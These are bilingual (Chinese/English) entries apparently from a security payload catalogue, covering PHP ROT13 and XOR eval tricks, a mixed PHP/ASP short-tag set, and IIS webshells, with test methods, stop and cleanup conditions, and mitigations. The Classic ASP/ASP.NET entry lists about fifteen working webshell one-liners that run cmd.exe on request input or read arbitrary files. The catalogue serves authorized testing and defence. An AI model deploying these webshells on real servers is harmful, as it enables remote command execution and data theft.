opsecTips.zh: PHP ROT13 解码后动态求值停止条件：所有系统命令替换为局部变量或固定字符串；若源站执行非标记函数、产生外连或写入 Web 目录，立即禁用测试路由。 本条重点观察“WAF、应用与 PHP 对 ROT13 和 Base64 的解码次数与顺序是否一致，并最终到达 eval”。
opsecTips.en: PHP ROT13 Decode-Then-Evaluate Patterns stop condition: Replace system commands with local variables or fixed strings; disable the route if the origin invokes a non-marker function, connects outward, or writes web storage. The entry-specific focus is whether the WAF, application, and PHP agree on ROT13 and Base64 decoding count and order before eval.

opsecTips.zh: PHP ROT13 解码后动态求值清理条件：完成后删除测试 PHP 文件，清理 opcode、WAF 与 CDN 缓存并恢复规则快照，再用正常请求确认没有遗留阻断或宽泛例外。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: PHP ROT13 Decode-Then-Evaluate Patterns cleanup condition: Remove test PHP files, clear opcode, WAF, and CDN caches, restore the rules snapshot, and verify normal requests have no residual block or broad exception. Recheck that no triggerable state remains for this technique.

name.zh: PHP 短标签与 ASP 风格混合集（待拆分）
name.en: PHP Short-Tag and ASP-Style Mixed Set (Split Required)

description.zh: 前三行是 PHP 短 echo 标签与历史花括号偏移，最后一行是 ASP 风格表达式，混合了不同运行时和已移除语法，必须拆分验证。
description.en: The first three lines use PHP short echo tags and legacy curly-brace offsets while the last is ASP-style syntax; the set mixes runtimes and removed syntax and must be split.

subCategory.en: PHP and ASP Legacy Syntax Split

overview.zh: PHP 短标签与 ASP 风格混合集（待拆分）是跨格式或跨运行时混合集，不能继续作为一个 Payload。需要拆分的核心为PHP 短标签、已移除的花括号数组偏移和 ASP 表达式分别由哪个运行时解析以及哪些版本仍支持。混合原因是原集合把 PHP 与 ASP 语法放在一个命令块，无法用单一 PHP 版本或 WAF 结论解释全部四行。完成审校必须达到每行均有明确目标运行时、版本、lint 或解析结果和迁移目标，原命令字节保持不变。
overview.en: PHP Short-Tag and ASP-Style Mixed Set (Split Required) is a cross-format or cross-runtime collection that cannot remain one payload. It must separate which runtime parses PHP short tags, removed curly-brace array offsets, and ASP expressions and which versions still support each form. The source is mixed because the source combines PHP and ASP syntax in one command block that cannot be explained by one PHP version or WAF decision. Completion requires every line has an explicit target runtime, version, lint or parse result, and migration destination while original bytes remain unchanged.

vulnerability.zh: 混合集会让成立条件、解析器、平台和证据标准互相污染。当前原集合把 PHP 与 ASP 语法放在一个命令块，无法用单一 PHP 版本或 WAF 结论解释全部四行，因此无法用一条攻击链说明“PHP 短标签、已移除的花括号数组偏移和 ASP 表达式分别由哪个运行时解析以及哪些版本仍支持”。每个分段必须独立绑定目标 Tool 或 Payload，并明确哪些原 command index 继续保留。
vulnerability.en: Mixed collections conflate prerequisites, parsers, platforms, and evidence. Here the source combines PHP and ASP syntax in one command block that cannot be explained by one PHP version or WAF decision, so one chain cannot explain which runtime parses PHP short tags, removed curly-brace array offsets, and ASP expressions and which versions still support each form. Each segment needs an independent tool or payload destination and explicit retained command indexes.

exploitation.zh: 对前三行使用多个 PHP 版本执行 lint，对最后一行使用 Classic ASP/ASP.NET 解析基线，分别标记有效、移除与仅文本输出结果。逐行只做格式、语法和无害标记验证，保留原始顺序和缩进，建立行号到目标的审校表；拆分前后对命令字符串做严格比较，不执行真实系统命令、外连或远程类加载。
exploitation.en: lint the first three lines across PHP versions and evaluate the last against Classic ASP or ASP.NET baselines, tagging valid, removed, and text-only outcomes separately. Perform only format, syntax, and harmless-marker checks line by line, preserving order and indentation in a line-to-destination ledger; compare command strings strictly and avoid real system commands, callbacks, or remote class loading.

mitigation.zh: 将 PHP 行归入 webshell-php、ASP 行归入 webshell-asp，并在目标条目标记版本；不再以 WAF 绕过名称维护跨运行时集合。拆分后逐个打开目标条目，验证教程、攻击链、引用和命令归属；原混合集从导航移除，所有原行必须有唯一主位置或明确的废弃理由。
mitigation.en: route PHP lines to webshell-php and the ASP line to webshell-asp with version tags, and stop maintaining a cross-runtime set as one WAF bypass. Open every destination after splitting to verify tutorial, chain, references, and command ownership; remove the mixed source from navigation and give every original line one primary home or explicit retirement reason.

title.zh: 盘点“PHP 短标签与 ASP 风格混合集（待拆分）”全部原行
title.en: Inventory every PHP Short-Tag and ASP-Style Mixed Set (Split Required) source line

description.zh: 逐行识别格式、运行时和语义，核对混合原因“原集合把 PHP 与 ASP 语法放在一个命令块，无法用单一 PHP 版本或 WAF 结论解释全部四行”，不依据旧名称推断分类。
description.en: Identify format, runtime, and semantics line by line, confirming why the source combines PHP and ASP syntax in one command block that cannot be explained by one PHP version or WAF decision, without trusting the old name for classification.

title.zh: 建立行号到目标的审校表
title.en: Create a line-to-destination review ledger

description.zh: 为每个分段分配现有 Tool 或 Payload，明确 retainedCommandIndexes，并采用“每行均有明确目标运行时、版本、lint 或解析结果和迁移目标，原命令字节保持不变”检查覆盖。
description.en: Assign every segment to an existing tool or payload, state retained command indexes, and use every line has an explicit target runtime, version, lint or parse result, and migration destination while original bytes remain unchanged to verify coverage.

title.zh: 保留“PHP 短标签与 ASP 风格混合集（待拆分）”来源字节
title.en: Preserve PHP Short-Tag and ASP-Style Mixed Set (Split Required) source bytes

description.zh: 测试步骤为：对前三行使用多个 PHP 版本执行 lint，对最后一行使用 Classic ASP/ASP.NET 解析基线，分别标记有效、移除与仅文本输出结果。拆分前后严格比较原 command 字符串，并只做无害格式或语法验证。
description.en: lint the first three lines across PHP versions and evaluate the last against Classic ASP or ASP.NET baselines, tagging valid, removed, and text-only outcomes separately. Compare original command strings strictly before and after splitting and perform only harmless format or syntax validation.

title.zh: 验证所有拆分目标
title.en: Verify all split destinations

description.zh: 实施“将 PHP 行归入 webshell-php、ASP 行归入 webshell-asp，并在目标条目标记版本；不再以 WAF 绕过名称维护跨运行时集合”，逐个检查目标教程、链路、引用、命令归属和导航，确认没有遗漏或双重主维护。
description.en: Apply route PHP lines to webshell-php and the ASP line to webshell-asp with version tags, and stop maintaining a cross-runtime set as one WAF bypass, inspect every destination tutorial, chain, reference, command ownership, and navigation, and confirm no omissions or dual primary ownership.

review.rationale: PHP 短标签与 ASP 风格混合集（待拆分）混合多个格式或运行时，必须按逐行审校结果拆分；原 monolithic command 不继续保留。
lineDisposition: PHP short-echo and backtick lines -> webshell-php-short-echo-backtick-boundary
ASP inline-expression lines -> webshell-asp-inline-expression-boundary

prerequisites.zh: 已冻结“PHP 短标签与 ASP 风格混合集（待拆分）”的原 command 字节与行号，目标均存在，retainedCommandIndexes 明确为 []。
prerequisites.en: Original bytes and line numbers for PHP Short-Tag and ASP-Style Mixed Set (Split Required) are frozen, destinations exist, and retainedCommandIndexes is [].

prerequisites.zh: 可离线判断每行格式、运行时和语义，并用每行均有明确目标运行时、版本、lint 或解析结果和迁移目标，原命令字节保持不变检查全部覆盖。
prerequisites.en: Every line can be classified offline by format, runtime, and semantics, using every line has an explicit target runtime, version, lint or parse result, and migration destination while original bytes remain unchanged for complete coverage.

analysis.zh: 阳性是每个原始行有唯一主去向或明确退役理由，且每行均有明确目标运行时、版本、lint 或解析结果和迁移目标，原命令字节保持不变。按旧名称整体迁移、只看总行数、同一行多主副本或无语法/运行时证据的归类均是假阳性。
analysis.en: A positive gives every source line one primary destination or retirement reason and every line has an explicit target runtime, version, lint or parse result, and migration destination while original bytes remain unchanged. Bulk migration by old name, count-only review, multiple primary copies, or classification without syntax or runtime evidence are false positives.

opsecTips.zh: PHP 短标签与 ASP 风格混合集（待拆分）停止条件：拆分阶段不执行系统命令、外连、远程类加载或文件读取；无法离线判定时停止并标记人工复核，不猜测目标。 本条重点观察“PHP 短标签、已移除的花括号数组偏移和 ASP 表达式分别由哪个运行时解析以及哪些版本仍支持”。
opsecTips.en: PHP Short-Tag and ASP-Style Mixed Set (Split Required) stop condition: Do not execute commands, callbacks, remote class loading, or file reads while splitting; stop and request manual review when offline classification is uncertain. The entry-specific focus is which runtime parses PHP short tags, removed curly-brace array offsets, and ASP expressions and which versions still support each form.

opsecTips.zh: PHP 短标签与 ASP 风格混合集（待拆分）清理条件：完成后删除解析输出与生成物，核对原 command 哈希、逐行表、目标去重和导航，并确认原混合集无可达副本。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: PHP Short-Tag and ASP-Style Mixed Set (Split Required) cleanup condition: Delete parser output and artifacts, verify command hash, line ledger, deduplication, and navigation, and confirm no reachable mixed-source copy remains. Recheck that no triggerable state remains for this technique.

name.zh: PHP XOR 标识符重建样例

description.zh: 使用字符串异或尝试重建函数名并动态调用，验证无字母数字表达式与 PHP 运行时语义；部分样例可能只构造无效标识符。
description.en: Uses string XOR operations to reconstruct and dynamically invoke identifiers, testing non-alphanumeric PHP expressions while recognizing that some samples may build invalid identifiers.

subCategory.zh: PHP 字符串异或与动态调用
subCategory.en: PHP String XOR and Dynamic Calls

overview.zh: PHP XOR 标识符重建样例用于比较安全设备、PHP lexer 与运行时对同一输入的处理，核心问题是字符串异或的实际结果是否形成可调用标识符，以及 WAF 对运算表达式与运行时函数名的理解是否一致。成立前提为：攻击者控制可执行 PHP 表达式，动态函数调用未受限制，且边缘规则只检查字母数字关键字。判定必须包含每个 XOR 子表达式的十六进制结果、最终标识符、is_callable 结果与无害调用输出能够对应，WAF 放行但语法无效的样例应明确记录为阴性。
overview.en: PHP XOR Identifier Reconstruction Samples compares security-device, PHP lexer, and runtime handling of the same input, focusing on whether string XOR results form callable identifiers and whether the WAF agrees with the runtime function name produced by the expression. It applies when the attacker controls executable PHP expressions, dynamic calls are unrestricted, and edge rules inspect only alphanumeric keywords. Evidence requires hex output of each XOR subexpression, final identifier, is_callable result, and harmless invocation output correlate; WAF acceptance of invalid syntax is a negative result.

vulnerability.zh: 多层差异出现在攻击者控制可执行 PHP 表达式，动态函数调用未受限制，且边缘规则只检查字母数字关键字时，可能造成“字符串异或的实际结果是否形成可调用标识符，以及 WAF 对运算表达式与运行时函数名的理解是否一致”。应用漏洞仍以最终可执行 PHP 数据流为前提，边缘规则只是纵深防御；若 PHP lint、版本语义或运行结果不成立，就不能依据规则未命中确认 RCE。
vulnerability.en: A differential appears when the attacker controls executable PHP expressions, dynamic calls are unrestricted, and edge rules inspect only alphanumeric keywords, potentially causing whether string XOR results form callable identifiers and whether the WAF agrees with the runtime function name produced by the expression. The application finding still requires an executable PHP data flow and the edge rule is only defense in depth; failed lint, incompatible semantics, or absent execution precludes RCE.

exploitation.zh: 先在目标 PHP 版本打印每个 XOR 结果并调用 is_callable，仅对有效标识符使用固定无副作用函数，避免直接执行原命令。固定 PHP、WAF 和源站版本，先做语法检查，再以一次性局部变量或固定字符串替代系统命令；每轮只改变一种大小写、编码、注释或运算形式，并通过请求 ID 关联各层结果。
exploitation.en: print every XOR result and call is_callable on the target PHP version, using only a fixed side-effect-free function for valid identifiers instead of executing original commands. Pin PHP, WAF, and origin versions, lint first, replace system commands with a one-time local variable or fixed string, change one case, encoding, comment, or operator form per run, and correlate layers by request ID.

mitigation.zh: 禁止不可信 PHP 求值和动态函数名，WAF 对规范化后的语法树进行检测，并将无效样例明确标为检测素材。回归应同时覆盖合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行、运行时不再动态求值，且 WAF 与应用采用一致的规范化模型。
mitigation.en: prohibit untrusted PHP evaluation and dynamic function names, inspect normalized syntax trees at the WAF, and label invalid samples explicitly as detection material. Regression should cover valid PHP behavior, original abnormal lines, and semantic variants while proving upload or write storage is non-executable, runtime evaluation is removed, and WAF and application normalization agree.

title.zh: 固定“PHP XOR 标识符重建样例”多层版本
title.en: Pin the PHP XOR Identifier Reconstruction Samples processing versions

description.zh: 记录 WAF 规则、PHP 版本、源站处理器与请求路径，核对前提“攻击者控制可执行 PHP 表达式，动态函数调用未受限制，且边缘规则只检查字母数字关键字”。
description.en: Record WAF rules, PHP version, origin handler, and request path, confirming that the attacker controls executable PHP expressions, dynamic calls are unrestricted, and edge rules inspect only alphanumeric keywords.

title.zh: 执行 PHP 语法与基线检查
title.en: Run PHP syntax and baseline checks

description.zh: 先对原行做 lint 并保存未变形请求基线，采用“每个 XOR 子表达式的十六进制结果、最终标识符、is_callable 结果与无害调用输出能够对应”区分放行、语法失败与真实执行。
description.en: Lint original lines and record an unmodified request baseline, using hex output of each XOR subexpression, final identifier, is_callable result, and harmless invocation output correlate to separate acceptance, syntax failure, and execution.

title.zh: 单变量验证“PHP XOR 标识符重建样例”
title.en: Run a single-variable PHP XOR Identifier Reconstruction Samples check

description.zh: 测试步骤为：先在目标 PHP 版本打印每个 XOR 结果并调用 is_callable，仅对有效标识符使用固定无副作用函数，避免直接执行原命令。只改变一种词法或编码形式，实际运行使用无害 PHP 表达式。
description.en: print every XOR result and call is_callable on the target PHP version, using only a fixed side-effect-free function for valid identifiers instead of executing original commands. Change one lexical or encoding form and use a harmless PHP expression at runtime.

title.zh: 统一规范化并移除求值路径
title.en: Align normalization and remove evaluation

description.zh: 实施“禁止不可信 PHP 求值和动态函数名，WAF 对规范化后的语法树进行检测，并将无效样例明确标为检测素材”并重放所有有效与无效行，确认源站不可执行且 WAF 结论与 PHP parser 一致。
description.en: Apply prohibit untrusted PHP evaluation and dynamic function names, inspect normalized syntax trees at the WAF, and label invalid samples explicitly as detection material and replay valid and invalid lines to prove the origin is non-executable and WAF decisions match the PHP parser.

review.rationale: PHP XOR 标识符重建样例保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已固定“PHP XOR 标识符重建样例”使用的 WAF 规则集、PHP 版本、源站处理器和请求路径，并确认：攻击者控制可执行 PHP 表达式，动态函数调用未受限制，且边缘规则只检查字母数字关键字。
prerequisites.en: The WAF ruleset, PHP version, origin handler, and request path for PHP XOR Identifier Reconstruction Samples are pinned, confirming that the attacker controls executable PHP expressions, dynamic calls are unrestricted, and edge rules inspect only alphanumeric keywords.

prerequisites.zh: 隔离站点可同时取得 WAF 动作、PHP lint/运行结果和每个 XOR 子表达式的十六进制结果、最终标识符、is_callable 结果与无害调用输出能够对应。
prerequisites.en: The isolated site can capture WAF action, PHP lint or runtime results, and hex output of each XOR subexpression, final identifier, is_callable result, and harmless invocation output correlate.

analysis.zh: 阳性要求同一输入被 WAF 放行、在目标 PHP 版本语法有效、到达可执行位置并取得每个 XOR 子表达式的十六进制结果、最终标识符、is_callable 结果与无害调用输出能够对应。放行但 lint 失败、函数在该版本失效、仅返回源码或未进入 PHP handler 均为假阳性，不能证明“字符串异或的实际结果是否形成可调用标识符，以及 WAF 对运算表达式与运行时函数名的理解是否一致”。
analysis.en: A positive requires WAF acceptance, valid target-version PHP syntax, arrival at an executable location, and hex output of each XOR subexpression, final identifier, is_callable result, and harmless invocation output correlate. Failed lint, removed semantics, source-only responses, or no PHP handler are false positives and do not prove whether string XOR results form callable identifiers and whether the WAF agrees with the runtime function name produced by the expression.

opsecTips.zh: PHP XOR 标识符重建样例停止条件：所有系统命令替换为局部变量或固定字符串；若源站执行非标记函数、产生外连或写入 Web 目录，立即禁用测试路由。 本条重点观察“字符串异或的实际结果是否形成可调用标识符，以及 WAF 对运算表达式与运行时函数名的理解是否一致”。
opsecTips.en: PHP XOR Identifier Reconstruction Samples stop condition: Replace system commands with local variables or fixed strings; disable the route if the origin invokes a non-marker function, connects outward, or writes web storage. The entry-specific focus is whether string XOR results form callable identifiers and whether the WAF agrees with the runtime function name produced by the expression.

opsecTips.zh: PHP XOR 标识符重建样例清理条件：完成后删除测试 PHP 文件，清理 opcode、WAF 与 CDN 缓存并恢复规则快照，再用正常请求确认没有遗留阻断或宽泛例外。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: PHP XOR Identifier Reconstruction Samples cleanup condition: Remove test PHP files, clear opcode, WAF, and CDN caches, restore the rules snapshot, and verify normal requests have no residual block or broad exception. Recheck that no triggerable state remains for this technique.

name.zh: Classic ASP 与 ASP.NET WebShell 处理器
name.en: Classic ASP and ASP.NET Webshell Handlers

description.zh: 覆盖 Classic ASP eval/execute、ASP.NET C#/VB 页面、ASHX 处理器、ProcessStartInfo 与文件读取形式，按运行时区分同一 IIS 家族的 WebShell。
description.en: Covers Classic ASP eval or execute, ASP.NET C# and VB pages, ASHX handlers, ProcessStartInfo, and file reads, distinguishing runtimes within the IIS family.

overview.zh: Classic ASP 与 ASP.NET WebShell 处理器用于核对IIS 根据 .asp、.aspx 或 .ashx 选择的运行时是否将请求参数传入动态代码、cmd.exe、PowerShell 或文件读取 API。该条目只在以下前提下适用：攻击者能将对应扩展文件写入 IIS 可执行目录，处理器映射启用，并且应用池身份具有子进程或文件权限。有效判定必须取得最终文件扩展与处理器、应用池日志、请求参数、固定输出和进程或文件审计事件完整关联；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。
overview.en: Classic ASP and ASP.NET Webshell Handlers checks whether the IIS runtime selected for asp, aspx, or ashx passes request values into dynamic code, cmd.exe, PowerShell, or file-read APIs. It applies when an attacker can place the relevant extension in an executable IIS directory, handler mapping is enabled, and the application-pool identity has child-process or file privileges. A valid finding requires the final extension and handler, application-pool logs, request value, fixed output, and process or file audit event fully correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution.

vulnerability.zh: 风险根因是攻击者能将对应扩展文件写入 IIS 可执行目录，处理器映射启用，并且应用池身份具有子进程或文件权限，使应用可能暴露“IIS 根据 .asp、.aspx 或 .ashx 选择的运行时是否将请求参数传入动态代码、cmd.exe、PowerShell 或文件读取 API”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。
vulnerability.en: The risk exists when an attacker can place the relevant extension in an executable IIS directory, handler mapping is enabled, and the application-pool identity has child-process or file privileges, exposing the runtime boundary of whether the IIS runtime selected for asp, aspx, or ashx passes request values into dynamic code, cmd.exe, PowerShell, or file-read APIs. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability.

exploitation.zh: 在隔离 IIS 中按 Classic ASP、ASP.NET Page 与 ASHX 分组，只使用固定 echo 或测试文件标记，记录缺少 RedirectStandardOutput 等导致的无效行。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。
exploitation.en: group tests by Classic ASP, ASP.NET Page, and ASHX in isolated IIS, use only fixed echo or test-file markers, and record invalid forms such as missing redirected output. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes.

mitigation.zh: 上传目录禁止脚本处理，移除不必要 ASP/ASP.NET 映射，应用池使用最小权限并阻止任意 ProcessStartInfo 参数和用户路径读取。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。
mitigation.en: disable script handling in upload storage, remove unnecessary ASP or ASP.NET mappings, run application pools with least privilege, and prevent arbitrary ProcessStartInfo arguments and user-controlled file paths. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths.

title.zh: 确认“Classic ASP 与 ASP.NET WebShell 处理器”执行入口
title.en: Confirm the Classic ASP and ASP.NET Webshell Handlers execution entry

description.zh: 定位真实输入、处理器与最终 API，核对前提“攻击者能将对应扩展文件写入 IIS 可执行目录，处理器映射启用，并且应用池身份具有子进程或文件权限”，并记录运行时版本和服务身份。
description.en: Locate the real input, handler, and final API, confirm that an attacker can place the relevant extension in an executable IIS directory, handler mapping is enabled, and the application-pool identity has child-process or file privileges, and record runtime version and service identity.

title.zh: 建立“IIS ASP/ASP.NET WebShell”安全基线
title.en: Establish the IIS ASP and ASP.NET Webshells baseline

description.zh: 使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“最终文件扩展与处理器、应用池日志、请求参数、固定输出和进程或文件审计事件完整关联”作为异常证据。
description.en: Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting the final extension and handler, application-pool logs, request value, fixed output, and process or file audit event fully correlate as abnormal evidence.

title.zh: 逐行验证“Classic ASP 与 ASP.NET WebShell 处理器”
title.en: Validate Classic ASP and ASP.NET Webshell Handlers line by line

description.zh: 测试步骤为：在隔离 IIS 中按 Classic ASP、ASP.NET Page 与 ASHX 分组，只使用固定 echo 或测试文件标记，记录缺少 RedirectStandardOutput 等导致的无效行。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。
description.en: group tests by Classic ASP, ASP.NET Page, and ASHX in isolated IIS, use only fixed echo or test-file markers, and record invalid forms such as missing redirected output. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker.

attackChain.payload:
<%eval request("cmd")%>
<%execute request("cmd")%>
<%=request("cmd")%>
<%response.write server.createobject("wscript.shell").exec("cmd.exe /c "&request("cmd")).stdout.readall%>
<%@ Page Language="C#" %>
<% Response.Write(new System.Diagnostics.Process{StartInfo=new System.Diagnostics.ProcessStartInfo{FileName="cmd.exe",Arguments="/c "+Request["cmd"],UseShellExecute=false,RedirectStandardOutput=true}}.Start().StandardOutput.ReadToEnd()); %>
<% Response.Write(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(Request["cmd"]))); %>
<%@ Page Language="VB" %>
<% Response.Write(CreateObject("WScript.Shell").Exec("cmd.exe /c " & Request("cmd")).StdOut.ReadAll()) %>
<script runat="server">void Page_Load(object sender,EventArgs e){Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]).StandardOutput.ReadToEnd());}</script>
<script runat="server">void Page_Load(object sender,EventArgs e){Response.Write(new System.IO.StreamReader(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]).StandardOutput.BaseStream).ReadToEnd());}</script>
<%@ WebHandler Language="C#" Class="Handler" %>
public class Handler : IHttpHandler { public void ProcessRequest(HttpContext context) { context.Response.Write(System.Diagnostics.Process.Start("cmd.exe", "/c " + context.Request["cmd"]).StandardOutput.ReadToEnd()); } public bool IsReusable { get { return true; } } }
<% var p = new System.Diagnostics.Process(); p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + Request["cmd"]; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>
<% Response.Write(System.IO.File.ReadAllText(Request["file"])); %>
<% Response.Write(Server.UrlDecode(Request["cmd"])); %>
<% var psi = new System.Diagnostics.ProcessStartInfo(); psi.FileName = "cmd.exe"; psi.Arguments = "/c " + Request["cmd"]; psi.UseShellExecute = false; psi.RedirectStandardOutput = true; var p = System.Diagnostics.Process.Start(psi); Response.Write(p.StandardOutput.ReadToEnd()); %>
<% var proc = new System.Diagnostics.Process(); proc.StartInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + Request["cmd"]) { UseShellExecute = false, RedirectStandardOutput = true }; proc.Start(); Response.Write(proc.StandardOutput.ReadToEnd()); %>

title.zh: 修复运行时边界并回归
title.en: Remediate and regress the runtime boundary

description.zh: 实施“上传目录禁止脚本处理，移除不必要 ASP/ASP.NET 映射，应用池使用最小权限并阻止任意 ProcessStartInfo 参数和用户路径读取”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。
description.en: After applying disable script handling in upload storage, remove unnecessary ASP or ASP.NET mappings, run application pools with least privilege, and prevent arbitrary ProcessStartInfo arguments and user-controlled file paths, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable.

review.rationale: Classic ASP 与 ASP.NET WebShell 处理器保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已在授权隔离环境定位“Classic ASP 与 ASP.NET WebShell 处理器”的真实输入点、处理器和运行时版本，并确认：攻击者能将对应扩展文件写入 IIS 可执行目录，处理器映射启用，并且应用池身份具有子进程或文件权限。
prerequisites.en: The authorized isolated environment identifies the real input, handler, and runtime version for Classic ASP and ASP.NET Webshell Handlers, confirming that an attacker can place the relevant extension in an executable IIS directory, handler mapping is enabled, and the application-pool identity has child-process or file privileges.

prerequisites.zh: 测试 worker 可随时销毁，并能同时观察最终文件扩展与处理器、应用池日志、请求参数、固定输出和进程或文件审计事件完整关联。
prerequisites.en: The test worker is disposable and can observe the final extension and handler, application-pool logs, request value, fixed output, and process or file audit event fully correlate.

analysis.zh: 阳性要求可控输入连续到达危险运行时 API，并取得最终文件扩展与处理器、应用池日志、请求参数、固定输出和进程或文件审计事件完整关联。代码片段、语法错误、HTTP 200、参数回显，或在已有本地 Shell 中手工运行命令均属假阳性或前置能力，不能证明“IIS 根据 .asp、.aspx 或 .ashx 选择的运行时是否将请求参数传入动态代码、cmd.exe、PowerShell 或文件读取 API”。
analysis.en: A positive requires a continuous path from controllable input to a dangerous runtime API plus the final extension and handler, application-pool logs, request value, fixed output, and process or file audit event fully correlate. Snippets, syntax errors, HTTP 200, reflection, or manual commands after an existing shell are false positives or prerequisites and do not prove whether the IIS runtime selected for asp, aspx, or ashx passes request values into dynamic code, cmd.exe, PowerShell, or file-read APIs.

opsecTips.zh: Classic ASP 与 ASP.NET WebShell 处理器停止条件：“Classic ASP 与 ASP.NET WebShell 处理器”只允许使用一次性固定标记；出现非预期子进程、外部网络、文件写入或权限变化时，立即终止 worker 并停止测试。 本条重点观察“IIS 根据 .asp、.aspx 或 .ashx 选择的运行时是否将请求参数传入动态代码、cmd.exe、PowerShell 或文件读取 API”。
opsecTips.en: Classic ASP and ASP.NET Webshell Handlers stop condition: Use only a one-time fixed marker for Classic ASP and ASP.NET Webshell Handlers; terminate the worker and stop on unexpected child processes, external network, writes, or privilege changes. The entry-specific focus is whether the IIS runtime selected for asp, aspx, or ashx passes request values into dynamic code, cmd.

opsecTips.zh: Classic ASP 与 ASP.NET WebShell 处理器清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Classic ASP and ASP.NET Webshell Handlers cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique.

name.zh: Classic ASP 动态执行与文件读取
name.en: Classic ASP Dynamic Execution and File Reading

description.zh: 覆盖 VBScript execute/eval、FileSystemObject 文件读取与 WScript.Shell 命令执行，验证 Classic ASP 请求参数是否进入高风险 COM API。
description.en: Covers VBScript execute or eval, FileSystemObject reads, and WScript.Shell execution to test whether Classic ASP request values reach high-risk COM APIs.

overview.zh: Classic ASP 动态执行与文件读取用于核对Request 参数是否进入 VBScript 动态执行、FileSystemObject 路径或 WScript.Shell 命令字符串。该条目只在以下前提下适用：IIS 启用 Classic ASP，攻击者可写入或影响 ASP 脚本，并且应用池身份允许 COM 文件或进程操作。有效判定必须取得ASP 处理器日志、请求参数、固定标记输出与 FileSystemObject 或 WScript.Shell 审计事件对应；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。
overview.en: Classic ASP Dynamic Execution and File Reading checks whether Request values reach VBScript dynamic evaluation, FileSystemObject paths, or WScript.Shell command strings. It applies when IIS enables Classic ASP, an attacker can write or influence ASP code, and the application-pool identity permits COM file or process operations. A valid finding requires ASP handler logs, request values, fixed marker output, and FileSystemObject or WScript.Shell audit events correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution.

vulnerability.zh: 风险根因是IIS 启用 Classic ASP，攻击者可写入或影响 ASP 脚本，并且应用池身份允许 COM 文件或进程操作，使应用可能暴露“Request 参数是否进入 VBScript 动态执行、FileSystemObject 路径或 WScript.Shell 命令字符串”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。
vulnerability.en: The risk exists when IIS enables Classic ASP, an attacker can write or influence ASP code, and the application-pool identity permits COM file or process operations, exposing the runtime boundary of whether Request values reach VBScript dynamic evaluation, FileSystemObject paths, or WScript.Shell command strings. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability.

exploitation.zh: 在隔离 IIS 分别测试 eval/execute、测试文件读取和固定 cmd echo 三类路径，不读取系统文件或执行持久化操作。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。
exploitation.en: test eval or execute, test-file reads, and fixed cmd echo paths separately in isolated IIS without reading system files or performing persistence. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes.

mitigation.zh: 停用不需要的 Classic ASP 与危险 COM 创建，上传目录不执行脚本，参数只进入固定业务操作且应用池权限最小化。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。
mitigation.en: disable unnecessary Classic ASP and dangerous COM creation, keep upload storage non-executable, route parameters only to fixed business operations, and minimize application-pool privileges. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths.

title.zh: 确认“Classic ASP 动态执行与文件读取”执行入口
title.en: Confirm the Classic ASP Dynamic Execution and File Reading execution entry

description.zh: 定位真实输入、处理器与最终 API，核对前提“IIS 启用 Classic ASP，攻击者可写入或影响 ASP 脚本，并且应用池身份允许 COM 文件或进程操作”，并记录运行时版本和服务身份。
description.en: Locate the real input, handler, and final API, confirm that IIS enables Classic ASP, an attacker can write or influence ASP code, and the application-pool identity permits COM file or process operations, and record runtime version and service identity.

title.zh: 建立“Classic ASP 请求执行”安全基线
